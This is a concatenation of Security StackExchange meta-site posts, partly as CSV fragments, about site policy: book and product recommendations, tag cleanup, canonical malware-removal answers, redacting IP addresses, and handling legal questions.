<p>The rational behind this is is written down in a <a href=""http://blog.stackoverflow.com/2010/11/qa-is-hard-lets-go-shopping/"">2010 blog post</a> aimed at Stackoverflow. The idea was that product recommendations go out of date quickly. While this is certainly true with some types of products (the example given deals with consumer electronics) it is far less true for other products, such as books.</p>

<p><br>
Books tend to be a good source of nicely bundled information and they tend to have a longer useful lifespan than, to use the same example, consumer electronics.</p>

<p>Finding the <em>good</em> books, among the long list of books on any given subject, especially if you are not an expert on the topic, is hard. At the same time, most professionals can quite easily point out good books in their area of expertise.<br>

<p>So, the combination of the usefulness of receiving expert advice, the value of good information sources and the fact that they tend to have a long (compared to other products) lifespan, I feel books should be exempt from the ""no product recommendations"" rule.</p>

<p><strong>In short</strong><br>
I feel books are far too valuable a source of information to be excluded from asking recommendations on. I personally feel that if we want people to better understand information security and its various disciplines, we should encourage people to read good books on the subject.</p>

<p>However, if the pop-up shows the message ""You have been caught by Ransomware"" and I previously know what Ransomware is, there's a slight chance I will pay (eventually using a throwaway credit card) if the asked money is not so much and I don't want to reinstall everything on my machine.</p>

<p>Questions and answers on Ransomware helps Ransomware builds a reputation, which turns in money for Ransomware developers. Isn't strange already the burst of traffic on that question? I've also had some discussion in comments which was extended into a chat discussion about that.</p>

<p>However that question is invaluable because it makes present that encrypting data may eventually cause the loss of the data (bugged crypto routine, or simply a 1 bit error: if you have a  1 bit error somewhere in your source code it will just turn into a compiler error, which is easy to fix, however 1 bit error in encrypted data turns into a permanent loss of all data).</p>

<p>Building a knowledge database doesn't seem to be your intention. What you really seem to want is to know if X is true, which is clearly a question, not an answer. </p>

<p><strong>Pro your idea</strong></p>

<p>The only downside I see of making it a question is that if you are indeed correct, it is unlikely that someone will post an answer that basically just says ""you are right"", which would then mean that the amount of unanswered questions increases. The solution to that would be to hope that someone just posts that, maybe underlined with some sources or further explanation.</p>

<p><strong>Contra your idea</strong></p>

<p>The downside of posting your own maybe false answer is that you aren't actually sure about it. People unknowingly post wrong answers all the time, but I don't think it's ideal to knowingly post answers that may very well be wrong. It adds unnecessary noise, and may mislead people. And what if nobody contradicts you, even though you are wrong? On QnA sites, it is expected that answers are true as far as the person posting them is concerned. </p>

<p>So at a minimum, you would need to add a disclaimer to your answer, eg ""I have serious doubt in the correctness of this answer, and I am primarily posting it to get feedback on by though process"". But such a disclaimer really only shows that this is a question, not an answer.</p>

<p>Additionally, the QnA format isn't really build for this. Downvoting costs points, the character limit on comments is quite restrictive, deleted comments can't be seen, comments can't be edited, and so on.</p>

<p><strong>tl;dr</strong> Answers shouldn't be used to post questions as it doesn't fit the QnA format or this sites mechanisms. ""Is X correct"" is a perfectly valid question, but ""X, maybe? please comment"" is not a good answer.</p>

<li><p>Any question you favorite will be listed in <a href=""https://meta.stackexchange.com/users/current"">your user profile</a> under the tab ""favorites"". This lets you find it easily when the question may otherwise get lost.</p></li>
<li><p>The favorites tab on your profile has a counter indicating how many of your favorite questions have changed since you last viewed that tab.

2352,2,2016-05-05T01:21:42.883,-1,,"<p>Books are among the <em>last</em> types of products that should be considered for exemption from the general rule on product recommendations.</p>

<p>Firstly, requests for books still suffer many of the same problems that are inherent to all product recommendations.</p>

<ul>
<li>Even with a well-written question, it's often hard to be sure of what personal preferences may sway an asker's ultimate choice for an accepted answer.</li>
<li>Even when given specific parameters, judging which one would ""best"" suit an asker's needs can be very subjective.</li>
<li>If budget is an issue, a product's suitability to meet the asker's requirement will change over time - and may especially be very short-lived in the case of promotional discounts.</li>
<li>To properly declare the ""best"" fit for anyone's needs - out of all the available products in a given space - requires a breadth of experience and sampling that practically nobody has, nor has time to acquire.</li>
<li>The list goes on, but I'll stop this part here.</li>
</ul>

<p>And all the while that they're sharing these problems with other product classes, books are probably the absolute worst suffers of this one:</p>

<ul>
<li>A product's suitability to fulfill any given need changes over time - often rapidly - as technology evolves, new solutions are developed, and previously-unrecognized problems with existing solutions are discovered.</li>
</ul>

<p>For comparison, let's look at some of the common things that SE gets asked for in these sorts of questions:</p>

<ul>
<li><strong>Websites</strong> and applications in the cloud are frequently updated to fix problems in content and functionality as they are discovered, add new features according to demand, and generally evolve along with the needs of their customers. This is usually done with absolutely zero effort on the part of the customer. This helps to maintain the website's value over time and can even serve to <em>increase</em> it - sometimes to the point that it could move <em>up</em> in rank when compared to competitors. (Though of course this also means a website's relative value could decrease if it doesn't keep up with its competitors' innovations.)</li>
<li><strong>Software</strong> can in many ways be, and often is, maintained similarly to websites in terms of patching flaws and bringing in new features on a regular basis. This typically requires minimal - and, in some cases, practically zero - effort or cost for the customer, unless a major new revision comes out that requires re-installation, a license upgrade, or (relatively infrequent) a re-purchase.</li>
<li><strong>Devices</strong> have a harder time keeping up with new developments, as the hardware they're shipped with usually cannot be changed to maintain pace with increasing requirements. If the hardware can be upgraded when necessary, it is usually a non-trivial issue for the customer and most often comes with a substantial cost. However, many devices can still have their lifetime extended - and, on occasion, value improved - by the issuance of firmware updates and upgrades. In that respect, they're a little bit like software but just a lot less flexible in general.</li>
</ul>

<p>And then we have...</p>

<ul>
<li><strong>Books</strong>, which do not change at all over time. Once bought, the dead tree matter will (at best) remain in exactly the same configuration as it had while it was sitting on the seller's shelf. Technology will move on, and often does very quickly, but the book's contents will not keep pace one iota. What is written as the absolute industry best practice in a book today may be revealed to have severe weaknesses tomorrow. But the book will still proudly proclaim that the broken solution is what you should be doing, and anyone who does otherwise is a moron. E-books provide an opportunity for the author/publisher to issue updates, but (and I'll grant I don't have much experience with this) I strongly doubt this is regularly done. More often, if you want to ""upgrade"" your book to a new version that has more current information, you'll have to shell out the full purchase price for a ""new edition"". And the vast majority of books never get one.</li>
</ul>

<p>So, my answer is no. Absolutely not. Ever. Even if the embargo on product recommendations gets lifted at some time in the unforeseeable future, there should be an exemption on <em>that</em> policy that keeps book recommendations (at the very least, for any kind that would be on-topic for Sec.SE) completely off-limits. Let the dead trees stay dead on Sec.SE.</p>

<h2>incident-analysis</h2>

<p>I can cause an incident on my own systems and throw an alarm, but may not know why I threw it in my IDS. At that point I should analyze the incident, but no investigation into scope and breach of attack may be needed.</p>

<h2>investigation</h2>

<p>This could mean that you're investigating something security related but isn't an incident. Maybe I want to investigate another system in our network, but I don't have an incident. I just want to make sure it's a safe system and go poking around. I have something I know is related to security, but I don't know what it is, or if it's safe and I should investigate it's purpose further.</p>

2365,2,2016-05-12T16:49:53.637,4,,"<h1>The problem</h1>

<p>This is a bad one. There are two and a half completely separate tags overlapping. I'll be using the Amazon Cloud as an example here: </p>

<h3>Cloud</h3>

<ul>
<li>Refers to someone else whose services or platform you use remotely</li>
<li>They can offer anything from Computational Services(Kinesis Stream), Platforms(EC2), APIs(API Gateway), Messaging(email, SMS), or Storage(S3, Deep Freeze)</li>
<li>This refers the them as a whole</li>
</ul>

<h3>Cloud Computing</h3>

<ul>
<li>Refer specifically to someone else whose services/platform you use to run software(EC2, Kineses Stream, APIs)</li>
</ul>

<h3>Cloud Storage</h3>

<ul>
<li>Refers specifically to someone else whose services/platform you use for storage of some sort. S3 and Deep Freeze are easy examples, however SMS and Email are also storage of messages in the cloud, and RDS is also cloud storage.</li>
</ul>

<p>Really they refer to the person offering all of the services(<em>the</em> Cloud), computational services(Cloud Computing), or storage only(Cloud Storage). Since this is the case it feels like these need some heavy and deep cleaning and are sadly the product of people's ignorance of what a cloud is(actual unknowing, not intentional unknowing).</p>

<hr>

<h1>The Solution</h1>

<p>Since it's such a bad intermixing of things that should be separate there are a few ways to handle this, but probably the fastest and simplest is to actually do what should have been done in the first place:</p>

<h1>Seperation of Ideas as Other Tags</h1>

<p>Put it all under one tag, and let people use other tags to clarify</p>

<ul>
<li><code>Cloud Storage</code> becomes two tags: <code>Cloud</code> <code>Storage</code></li>
<li><code>Cloud Computing</code> becomes two tags: <code>Cloud</code> <code>Program/Computing/Services</code>(whatever makes the most sense?)</li>
<li><code>Cloud</code> becomes... well <code>Cloud</code> with whatever they need to address the specific part of it like <code>Cloud</code> <code>Company</code> or <code>Cloud</code> <code>Platform</code> or <code>Cloud</code> <code>MFA</code></li>
</ul>

<p>This way we have a Cloud tag to specify it's related to a cloud, and other tags to tell us what specific part of the cloud it belongs too.</p>

<hr>

<p>This separation gives use one advantage in that it helps identify those who need more help. If a question is just tagged as Cloud and is about Cloud Servers or Cloud Computing we know they might not know how to distinguish between the two and it could help us address what level we need to address it on and how long our trail of bread crumbs should be. A seasoned professional is probably fine with a blurb. A new person probably needs an article. This could help tell us which type of user it is before we edit their tags and post an answer.</p>

2379,2,2016-05-18T13:35:52.557,1,,"<p>In my experience, ""Incident analysis"" is part of a formal event lifecycle.   A collection of security events, through automated or manual correlation are collected for formal analysis.</p>

<p>From a procedural standpoint, incident analysis may result in an investigation.   The difference being the depth of analysis, the expertise of the investigator, the time they spend and the expectations of the report.  If an incident takes more than a few minutes to analyze, it should be raised for an investigation, else it's interfering with daily monitoring tasks.</p>

<p>One problem with the word ""incident"" is that outside the security practice, it is a much heavier word, associated with successful breaches, denial of service, virus outbreaks etc.  It's accurate there too, but when customers ask for reports of your most recent security incidents, they're not asking for the false-positive the printer generated, or the massscan which hit you on Tuesday.   They want the big stuff.</p>

<p>Investigations also go way beyond the Incident-analysis meaning, including missing laptops, devices knocked offline, indications of inappropriate access, missing evidence of authorization before granting access to systems, etc.</p>

<p>For now, the meaning of the word depends on who I'm talking to.  If I'm talking to SOC analysts, ""Incident"" means a bunch of correlated events.  ""Investigation"" means what you're doing with those correlated events.   </p>

<p>If I'm talking to customers or management ""Incident"" means a breach or similar security fail, while ""Investigation"" means a multi-day or multi-week thing which is going to have a root-cause analysis and will result in an ugly MS Word document filed for review by auditors, investors or customers.</p>

<p>The outside world and even the best product documentation confuses the language.  E.g., I've been reviewing Splunk's capabilities in regard to incident analysis, even they get fuzzy on the terms... notice how it's the ""Incident review"" dashboard, but they talk about ""Events"", ""Notable Events"" and ""investigation""</p>

Both answers make a pretty good effort to explain the reason why a ""standard"" solution (antivirus, antirootkit, ...) is often not enough, and both answers use, at least in my opinion, a very clear language.</p>

<p>It is true that nuking from orbit is not a ""very accessible"" option, maybe for economic reasons or because the user doesn't have a clean backup of his personal data. However, there are a lot of situations in IT (not only related to security) for which a user calls tech support, only to hear that he should buy another computer. It is not pleasant, but sometimes it is the only way. Although we are not a tech support website, I feel we have the duty to answer honestly, even if the solution is, so to say, a bit brutal.</p>

<p>Of course, there are also cases in which nuking from orbit may not be required. There was a recent question (that I can't find now) in which the OP explained that a friend told him he had gained access to his phone. In my opinion, nuking from orbit simply because a friend told you that he hacked your phone is slightly an exaggeration (who would want to throw $500 or even more out of the window because of a potential prank?), although it may be actually necessary.</p>

<p>I don't know if a canonical answer should be written, but if it was, it should include in my opinion:</p>

<ul>
<li><p>the fact that a weird behavior of your PC/MAC/smartphone is not necessarily due to malware;</p></li>
<li><p>basic ways to understand, or at least guess, where is the problem. For example, if you use Firefox and all websites redirect to a malicious website, but in Chrome everything works fine, you could run a complete scan and uninstall Firefox, and this might be enough. Of course,it may not work, which leads me to the next point</p></li>
<li><p>tests and suggestions in increasing order of difficulty and ""brutality"", for lack of a better word, where the most brutal suggestion is clearly nuking from orbit. For example, in the case of pop-up ads, or a malicious Chrome plugin, I would point to <a href=""https://support.google.com/chrome/answer/2765944"" rel=""nofollow noreferrer"">https://support.google.com/chrome/answer/2765944</a>, which contains a lot of useful information, and explains how to run Chrome Cleanup Tool, reset browser settings, and so on. Only if these suggestions fail, we should tell the user to nuke it from orbit;</p>

<ul>
<li>we should also include a basic explanation of why certain drastic measures, such as nuking from orbit, may be necessary;</li>
</ul></li>
<li><p>possibly, the suggestion to seek advice from technical support. While this is a community of InfoSec professional (not including me), and there are really expert people here who I respect and admire, some of us might be tempted to say ""nuke it"" when we are not certain, and often we cannot be certain because we don't know the full story and/or because we don't have physical access to the device. An experienced technician with access to the device, and more time to ask questions to the customer, might find an alternative solution.</p></li>
</ul>

<p>Just to be clear, I'm not saying that we should answer this kind of questions with ""Go to tech support. Period"", but I think that before making the ultimate decision to nuke it from orbit, the user should have the possibility to try for the last time. </p>

<p>Best-case scenario: the IT guy manages to repair the computer. Worst-case scenario: the IT guy tells the user to throw the computer away. In my limited experience, cost of repair &lt; value of the whole computer, partly because, where I live, IT repair shops also sell computers, but YMMV. If this is the case, the user doesn't lose more money from calling tech support than he would from straight-up nuking the computer.</p>

<p>Therefore I would like to focus on the point, <strong>if we should give an answer at all.</strong></p>

<p>It is a very trivial question to ask for help with a virus, that triggers trivial answers (""Nuke from orbit"", ...) - so the question itself might or might not be valid to ask. </p>

<p>But there are 5 more important points to consider in order to decide, if we should write a canonical answer or not:</p>

<ol>
<li>It is trivial for us to give an answer (close as duplicate, point to the canonical answer)</li>
<li>This site should be helping people, usually technical experts or people that want to learn more about information security - but also for people that are impacted due to non-existing security!</li>
<li>If the question gets closed and then deleted after some hours / days anyway, why not close it with a link to helpful information? I see no downside for this (see point 1.)</li>
<li>Having a canonical answer keeps people from wasting time by writing a serious answer, that mostly will contain the points from a canonical answer.</li>
<li>The usually linked answer: <a href=""https://security.stackexchange.com/questions/39231/how-do-i-deal-with-a-compromised-server"">How do I deal with a compromised server?</a> contains a lot of steps, that are not possible or do not make sense for a personal computer. </li>
</ol>

<p>Example: <em>""If the system holds anyone's personal data, immediately inform the person responsible for data protection""</em> ... if it is your own computer, there simply is nobody else to inform.</p>

<p>Are there any downsides to having a canonical Q&amp;A for this very topic?</p>

<p>From the top of my head I cant think of any downsides to be honest. Even if there are, there would be some upsides that might outweigh the downsides. </p>

The whole concept of an inventor spurting out his concoction and asking other people to point out the issues never worked well. Or never worked at all, in fact.</p>

<p>Long ago (before the Disco era!), cryptographers came to the conclusion that the only sane way to design a secure algorithm is to publish it <em>with</em> a thorough analysis that explains why it is secure, in a positive way (e.g. demonstrating that the highest probability differential is lower than 2<sup>-7</sup> per round, not simply stating that they don't see how to break it); and <em>then</em>, a necessary second step is to submit the algorithm to public review.</p>

<p>One way to see it is to consider the direction of the convincing. In a properly conducted design process, the inventor tries to convince reviewers that his algorithm is secure. In a ""is my scheme secure"" system, the reviewers try to convince the inventor that his algorithm is not secure. The latter only leads to sorrow.</p>

<p>I don't think there is any technical way to deal with such questions that would not involve crushing the ego of the misguided individual who dares ask such a question.

<p>The idea of an AI which is so powerful to automatically solve CAPTCHAs <strong>and</strong> to automatically write useful comments based on a given context is not currently practical.

<p>An AI with that level of sophistication could pass the Turing test, which means that it would be indistinguishable from human users. This, in turn, would mean that the spambot problem would be equivalent to the trolling problem on online communities, if the AI comments were not random but still not constructive, or to an even more complex problem, if the comments were also constructive.</p>

<p>For example, what would happen if human users rated as ""not constructive"" a comment which is actually meaningful, but conveys an opinion contrary to that of the majority of the users in the community? This is possible, and it already happens in some online communities. How could you distinguish between a constructive comment downvoted for this reason, and a comment downvoted because it is generated by an AI spambot? </p>

<p>Would it even make sense to talk about spam, and if so, how could we draw the line between this kind of ""spammer"" and a user with a different opinion from the majority? </p>

2401,2,2016-06-10T10:10:24.690,2,,"<p>How about something like:</p>

<p>Your question has been marked as a duplicate of this one because you've asked whether a specific security scheme you have developed is secure. This question is commonly asked, but it isn't really answerable on Security.se.</p>

<p>There are two stages to demonstrating that any conceived security scheme is secure. Firstly, the creator should themselves look to prove the strength, by demonstrating properties which can be mathematically proven which the scheme takes advantage of. Secondly, once they've done this, they should take these proofs and the scheme to other people, asking them to find any flaws. This is to ensure that the creator hasn't missed something in the creation or proof phases, and should be considered a positive thing - if flaws are found, they can be fixed, or the scheme can be halted before being used in live environments.</p>

<p>For example, the <a href=""http://keccak.noekeon.org/"" rel=""nofollow"">Keccak</a> hashing algorithm, which became SHA-3, was first published in 2006, with the authors providing details on elements of previous hashing algorithms which they attempted to improve in <a href=""http://keccak.noekeon.org/TheRoadFromPanamaToKeccak.pdf"" rel=""nofollow"">a paper</a>. They also proved mathematically various components of the algorithm, showing that various properties were held by it. It was then part of the NIST SHA-3 competition, starting in 2008, where some flaws were found by the teams of cryptographers looking at it, and it could be refined and improved to fix these. In 2012, six years after the initial publishing, the algorithm was selected as SHA-3, and the final version was published in 2014.</p>

<p>If you have created a new scheme, you should first look to find vulnerabilities yourself, building a working implementation and trying to spot undesirable features or flaws. For example, a new password storage method would need to demonstrate that it doesn't store the same value for two users with the same password, among other things, and this can be demonstrated easily. Only once you can prove that your system fixes known flaws in existing systems, or at least reduces them, should you look for third party validation. This could come from university researchers or specialist security audit companies, but takes time and resources which unpaid security.se visitors are unlikely to be able to offer.</p>

2402,2,2016-06-10T13:57:18.807,9,,"<p>In my opinion, we don't need to know the IP addresses, at least not in their complete form.</p>

<p>Maybe if those addresses are already blacklisted, and the OP doesn't know it, we could tell with some confidence that they are probably being used to carry out some attack, as opposed to be (for example) the addresses of normal users who entered the wrong password. </p>

<p>But usually, after the third or so login attempt, we can already say that an attack is going on. As far as DDoS attacks are concerned, they most likely use botnets, and if a regular user is caught in the crosshairs of an anti-DDoS IP ban, a successful DDoS defence may be well worth it. In all other situations (SQL injections, port scanning, etc.), the knowledge of the IP address is - in my opinion - useless for the purpose of an answer, and could only be useful if the OP decided to file a report to the police.</p>

<p>Another possible reason could be geolocation. Once in a while, questions arise on whether to block or not IP addresses based on geolocation. Sometimes this might be useful (e.g. to protect SSH servers from Chinese IP addresses, if it is only used by devices in the USA, without the need of a VPN, etc.), but sometimes it is not. In any case, the last octet is of no use, and in most cases the last two octets are irrelevant, since most country-level IP blocks are defined by the first two octets.</p>

<p>In the end, I think we should at least redact the last octet, and possibly the last two octets.</p>

<p>By the way, Lasagna pointed out that the edit history is visible. I don't think this is a serious issue, given that IP addresses are not meant to be secret, and that they cannot be easily tied to an individual.

I would like to continue the quest to rid the world of bad tags by proposing a new candidate for burnination: <a href=""https://security.stackexchange.com/questions/tagged/token"" class=""post-tag"" title=""show questions tagged &#39;token&#39;"" rel=""tag"">token</a>. It is used for a multitude of purposes:</p>

<ul>
<li>CSRF tokens</li>
<li>OAuth tokens</li>
<li>Authentication tokens</li>
<li>Session IDs</li>
<li>The beloved South Park character.</li>
</ul>

<p>Just like file, the concept is both broad and vague. No one would say ""I am a token expert"" on a job interview. No one would say ""Hey, I have a question about tokens"" to a collegue. The natural follow up question to both is ""Well, what kind of token are you talking about?"".</p>

<p>There is a usage excerpt, but it was added recently and does not reflect how the tag is used:</p>

<blockquote>
  <p>An ""authentication token"" is either a hardware device, or piece of data used as part of an authentication mechanism.</p>
</blockquote>

<p>So, this is what I propose: Questions about CSRF tokens should be tagged with <a href=""https://security.stackexchange.com/questions/tagged/csrf"" class=""post-tag"" title=""show questions tagged &#39;csrf&#39;"" rel=""tag"">csrf</a>. Questions about OAuth tokens should be tagged with <a href=""https://security.stackexchange.com/questions/tagged/oauth"" class=""post-tag"" title=""show questions tagged &#39;oauth&#39;"" rel=""tag"">oauth</a>. I think you see the pattern here. Questions about X-tokens should be tagged with X, not token. (Actually, I think a lot of these questions are tagged with token just because the OP wanted to tag with ""X token"" but didn't know that you can't have a space in a tag name.) Questions about generating secure random tokens should be tagged with <a href=""https://security.stackexchange.com/questions/tagged/random"" class=""post-tag"" title=""show questions tagged &#39;random&#39;"" rel=""tag"">random</a>. If there is a need for a tags matching the current tag wiki quoted above, they should be called <a href=""https://security.stackexchange.com/questions/tagged/authentication-token"" class=""post-tag"" title=""show questions tagged &#39;authentication-token&#39;"" rel=""tag"">authentication-token</a> and/or <a href=""https://security.stackexchange.com/questions/tagged/hardware-token"" class=""post-tag"" title=""show questions tagged &#39;hardware-token&#39;"" rel=""tag"">hardware-token</a>.</p>

<p>We are dealing with a lot of questions here - 110, and counting. If we do this, we should do it slowly so as not to spam the main page. It does not matter if this takes some time. It is also encouraged to fix other flaws in questions while editing them.</p>

<p>So, what do you think? Should the tag be burninated? If not, what should be done to fix it? Any additions or changes to my retagging suggestions?</p>

<p>However, where I agree with you is that depending on the screen settings and potential visual limitations affecting the reader, these links may indeed be hard to distinguish from normal text.</p>

<p>That's the reason why often visual indications such as links rely on two different criteria, traditionally links are shown:</p>

<ol>
<li>Using a different text color,</li>
<li>Underlined.</li>
</ol>

<p>This also allow the reader to detect successive different links, which is just currently impossible on StackExchange without hovering the links.</p>

<p>However, underlined text within a paragraph may also slightly reduce readability and comfort (that's why Wikipedia for instance choose to underline them only while hovering, as a right balance), and a poster on <a href=""https://ux.stackexchange.com"">UX.se</a> also <a href=""https://ux.stackexchange.com/a/14361/73288"">suggested the following</a>:</p>

<blockquote>
  <p>I'm pretty sure that this is an intentional part of the Stack Exchange
  UX.</p>
  
  <p>Answers are supposed to be standalone, because external sites may go
  offline, or rename/take down the page linked to. If they primary
  content of the answer was a link to another site, then that answer is
  now useless.</p>
  
  <p>The links are not underlined, so as not to distract from the answer,
  since they're supposed to only go to supplemental material. Similar
  reasoning exists for using colors that have less contrast to the text
  as opposed to the general web.</p>
</blockquote>

<p>So, without being into StackExchange little secrets, chances are this may be intentional and that arguments privileging text readability and unity over links parsing easiness simply won.</p>

<p>To provide some more general guidelines, I would say that when asking a question it is OK to have a personal style, and that style should be preserved by editors <em>as long as it is clear and conscice and does not get in the way of readability.</em> That was not a problem at all with your post - it was perfectly readable.</p>

<p>At the same time, when your question is edited you should not just blindly rollback everything just because you disagreed with some parts. Go through every individual change, have a think about it and try to see it from the editors perspective (this especially apply if you like me are not a native or fluent english speaker). But if you still think some changes were unwarranted, you are free to change them back. If you want to you can explain your reasons for doing so in the edit summary or in a comment.</p>

<p>So I would say that you can go ahead and change the bad parts of the edit back if you want to.</p>

<p>They are right that this sentence seems to suggest that this question is on-topic. But the close reason starts with ""Questions seeking product recommendations are off-topic"", and it seems pretty clear to me that that is what the OP is asking for.</p>

<p>As the linked blog post is a 6 year old post that focuses on hardware product recommendations on Super User, I thought it would be a good idea to ask how it is handled here and to possibly re-think the close reason. </p>

<p>techrafs reason for not wanting to close these kinds of questions:</p>

<blockquote>
  <p>The purpose of closing questions with recommendation requests is to limit low-quality, low-value, quickly-becoming-obsolete, limited-to-particular-situation answers. I cannot see how this question could attract such answers. Quite the contrary it explains (2) and is (3) (which are relevant and specified in the guidelines) so that it allows to create knowledge. For given conditions there is such and such solution. This is learning.</p>

<p>I would actually agree with some of this, but I don't think that this is how it is currently handled. </p>

<p>So my questions are:</p>

<ul>
<li>Is the linked question a question asking for a product recommendation and should thus be closed?</li>
<li>As per current policy, should all questions asking for product recommendations be closed, or only bad ones (however that is defined)?</li>
<li>Is it time to rethink the approach to product recommendations at sec.se? Software does seem to age slower than hardware. A suggestion to use truecrypt for encryption would for example have been valid for almost 10 years. Many answers to other questions aren't even valid that long. And product recommendations can add valuable information to this site. On the other hand, they could also lead to long, mostly outdated link-lists.</li>

For example, our many questions about password hashing are on-topic on both sites — but they would get different answers: Crypto.SE tends to have answers aimed at crypto designers and implementers, while on this topic Security.SE caters mostly for system administrators and end-users. The general observation about questions on-topic on both sites is about this kind of questions.</p>

<p>A question like “how do I find test vectors for this algorithm” has nothing to do with security. Whether a cryptographic algorithm matches a security policy is about security. Whether a cryptographic implementations is secure against a threat is about security. But getting the mathematical computation right is not about security. “How do I find test vectors for this algorithm” is off-topic here.</p>

In the early days, it was more accepting of off-topic (e.g. non-security-related crypto) or unanswerable questions (e.g. polls), in the name of increasing traffic.

2460,2,2016-08-09T00:44:09.023,2,,"<p>“Product recommendation” is a bit vague. Most questions on Stack Exchange take the form “I have this problem, how do I solve it?”. Sometimes the natural solution to a problem is to use a ready-made product. In such cases, the question is considered a product recommendation question.</p>

<p>Questions may be formulated as a product recommendation request, when the question explicitly includes the expectation that a solution will be a ready-made product. We tend to frown on these questions because they often fall into some common pitfalls: asking what the best product and forgetting to state the precise problem that needs solving.</p>

<p>“What's the best product of this type?” is <a href=""https://softwarerecs.stackexchange.com/help/dont-ask"">not an answerable question</a> and such questions should be closed. This is what the close reason is about. Because of a system limitation, the close reason is listed under off-topic, even though that doesn't make sense when the product type is related to security — but custom close reasons can't be added under “too broad” or “unclear what you're asking”.</p>

<p>“How do I solve my [sufficiently precisely stated] problem?” is a valid question, and the close reason does not apply to these. As the second sentence states, “describe your situation and the specific problem you're trying to solve” — and then you should have a good question. It's often best not to frame the question as “What product should I use?” but as “how do I solve my problem?”. Nonetheless, some problems <em>do</em> naturally call for a ready-made product. When product solutions are expected, I recommend following the <a href=""https://softwarerecs.stackexchange.com/help/on-topic"">Software Recommendations</a> <a href=""https://softwarerecs.meta.stackexchange.com/questions/336/what-is-required-for-a-question-to-contain-enough-information"">question</a> and <a href=""https://softwarerecs.meta.stackexchange.com/questions/356/what-is-required-for-an-answer-to-be-high-quality"">answer</a> guidelines.</p>

<p>In the specific case of <a href=""https://security.stackexchange.com/questions/133141/is-there-free-software-than-decrypts-a-single-file-on-windows-and-android"">https://security.stackexchange.com/questions/133141/is-there-free-software-than-decrypts-a-single-file-on-windows-and-android</a>, there is a specific problem to solve, so this question is fine for Stack Exchange. It doesn't fall under the “product recommendation” close reason. However, this question is off-topic here, because the question is a purely functional one: it's driven by software compatibility, not by security policies. Since the question does follow the “software to do X” model, it is on-topic on <a href=""https://softwarerecs.stackexchange.com/tour"">Software Recommendations</a> where it has been <a href=""https://softwarerecs.stackexchange.com/questions/35299/is-there-free-software-than-decrypts-a-single-file-on-windows-and-android"">migrated</a>.</p>

<p>Q: ""How many people can be on a team?""</p>

<p>A: ""...<strong>but specifically asking people on the internet to help you solve the problem is cheating""</strong></p>

<p>Therefore, I believe that having a Security Exchange team, while a terrific idea, is considered as cheating and will result in the disqualification of all participating users.
Instead, I think it's best that the big team splits into smaller teams and each team works alone to ensure the legitimacy of their score :)</p>

<blockquote>
  <p>Please don't ask questions seeking legal advice on a specific matter.

</blockquote>

<p>I'm not sure whether in practice such questions are tolerated on their site and where exactly they put the limit between generic and specific matter (it's like here: we are OK to answer security questions or provide some help for an audit, we are not OK to break systems on request or provide free audits).</p>

<p>I have the impression that Law.SE is not a law site either, but a site <em>about</em> laws which is not the same thing.</p>

<p>I would not feel comfortable in officially redirecting people coming with questions they would consider out-of-topic. On the other side, one can see that they even have an active <a href=""https://law.stackexchange.com/questions/tagged/hacking"">hacking</a> tag, so maybe with an appropriate wording to avoid polluting their site this would do the trick?</p>

<p>Otherwise, the easiest way will be to proceed as we do now: if a question is a really good fit for Law.SE (and off-topic here), just request it's migration through the flagging system (you will need to use the <em>In need of moderator attention</em> since the Law.SE website is not part of the post migration list).</p>

<blockquote>
  <p>You should feel free to migrate posts that ask legal questions without asking for legal advice.</p>
  
  <p>Of those remaining: Many questions asking for legal advice can be ""genericized"" so as to ask for legal information.</p>
</blockquote>

<p>So if we can encourage users to transform ""what should I do?"" questions into ""what does the law say?"" questions, then they would be happy to have them migrated.</p>

<p>As @WhiteWinterWolf also said, this clip from <a href=""https://law.stackexchange.com/help/on-topic"">their help page</a> says it all:</p>

<blockquote>
  <p>Law Stack Exchange is for legal professionals, students, and others with experience or interest in law.</p>
  
  <p>...</p>
  
  <p>Please don't ask questions seeking legal advice on a specific matter. These are off-topic for Law Stack Exchange. While users generally contribute answers in good faith, the answers are not legal advice, and contributors here are not your lawyer.</p>
</blockquote>

<p>So that's pretty clear that Law.SE is not a free lawyer service; they want to discuss general points about the legal system, famous historical court rulings, trade tips about being a legal professional, etc; they don't give a dime about your problems.</p>

<p>Many of the questions like this that I've seen on security.SE should really be closed with ""You need to hire a lawyer dude"" -- they won't be any more welcome on Law.SE than they are here. Although a few are more like legal thought-experiments that may be interesting to others. </p>

<p>I would avoid putting explicit reference to Law.SE in our help page out of fear that we generate a flood of free lawyer requests. Rather, let high rep users vote to close or flag for mod migration as usual.</p>

<p>Taken literally, you are asking for all configurations of all possible different firewalls that could in any way help protect against social engineering. That is very broad indeed, but I don't think that is what you want to know.</p>

<blockquote>

<p>Instead of asking for the exact configuration, you ask about what group of attacks (e.g. phishing) you should look into. Then later, you can ask a more specific question about how to prevent it (e.g. ""How do I configure my firewall of brand X to detect phishing attacks?"").</p>

<p>That is at least my two cents. Others might not agree, and I can not guarantee that the question will be reopened if you make that change.</p>

(And perhaps it is for general-purpose PCs as well.) And I don't think I have any real issue with it being that.

<p>Title: Checklist for a VP licensing a web application?</p>

<p>My situation is as follows:</p>

<ul>
<li><p><strong>Me:</strong> I'm a software developer (not a security specialist). I'm working for/with a startup. I'm the most technical (and/or only technical) person in the startup.</p></li>
<li><p><strong>Web application:</strong> I have written a web application using ASP.NET. Currently, users login with username and password. Data is stored in an SQL database and managed via the ""ASP Membership Provider"" framework (which hashes passwords, generates session cookies, etc.). The application is configured to only support SSL (i.e. HTTPS).</p></li>
<li><p><strong>Web host:</strong> The application is is hosted on a commercial web host (using IIS, MS SQL, etc). The host have their own data centre (hardware and building). This web host also offers another solution, i.e. they resell and manage hosting on Microsoft Azure cloud, which I may switch to presently. It's ""managed"" hosting, so their job to keep system software and patches up to date.</p></li>
<li><p><strong>Customers:</strong> The application is intended for corporations and/or government agencies (not consumers). Customers use it to create, store, edit, and share operations data, including information about their physical assets (buildings) and their employees, the information including geolocation and other security-sensitive information.</p></li>
<li><p><strong>Threat:</strong> Theft of customer data could help terrorists' planning, and/or help thieves to steal customer's valuables.</p></li>
</ul>

<p>My question is as follows.</p>

<p>Any potential customer, i.e. the VP of IT (or the CIO or similar), who considers buying licenses for this application, is likely to want to know about its security. ""If we use this application, will my data be secure?""</p>

<ul>
<li>What questions (about security) are they likely to ask?</li>
<li>Is there a check-list or something of security-related questions I should consider?</li>
<li>Is there anything (of finite length) I can read, to kind of get up to speed on this topic?</li>
<li>What should I do, to satisfy my own conscience that I've been diligent in considering the security of customers' data?</li>
</ul>

<p>In summary:</p>

<ul>
